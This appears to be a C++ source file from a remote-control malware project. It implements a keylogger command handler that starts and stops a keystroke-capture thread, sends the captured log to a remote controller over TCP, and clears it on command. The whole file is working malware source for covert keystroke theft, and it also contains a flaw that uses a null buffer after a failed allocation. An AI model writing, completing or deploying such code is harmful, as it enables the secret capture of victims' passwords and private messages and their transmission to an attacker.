#include "command/execute/KeyloggerExecuter.h"

#ifdef _DEBUG
#include <iostream>
#include <fstream>
#endif // _DEBUG

#include <cstdlib>

#include "networking/interfaces/ITCPClient.h"


using namespace command;

bool
KeyloggerExecuter::Execute(
    char const *byte_array,
    uint32_t length,
    networking::ITCPClient& connection)
{

    if ( length != sizeof(s_Translation) )
        return ( false );

    return ( ExecuteTranslatedByteArray((s_Translation*)byte_array, connection) );
}

bool
KeyloggerExecuter::ExecuteTranslatedByteArray(
    s_Translation *byte_array,
    networking::ITCPClient& connection)
{
    bool success = true;

    success &= ManageThread(byte_array->thread_state);

    if ( true == byte_array->get_data )
    {
        success &= SendLog(connection);
    }

    if ( true == byte_array->clear_data )
    {
        m_keylogger.ClearLog();
    }

    return ( success );
}

bool
KeyloggerExecuter::ManageThread(
    ThreadState state)
{
    switch ( state )
    {
    case Start:
        m_keylogger.StartThread();

        break;

    case Stop:
        m_keylogger.StopThread();

        break;

    case Keep:
        // Do nothing.

        break;

    default:
        // Unknown state.

        return ( false );
        break;
    }

    return ( true );
}

bool
KeyloggerExecuter::SendLog(
    networking::ITCPClient& connection)
{
    uint32_t buffer_len = m_keylogger.LogSize();

    char *buffer = (char*)malloc(buffer_len);

    if ( nullptr == buffer )
        connection.Send("err", 3);

    int bytes_read = m_keylogger.GetLog(buffer, buffer_len);

    if ( bytes_read != connection.Send(buffer, bytes_read) )
    {
        connection.Send("err", 3);
        return ( false );
    }

    connection.Send("o.k", 3);

    return ( true );
}
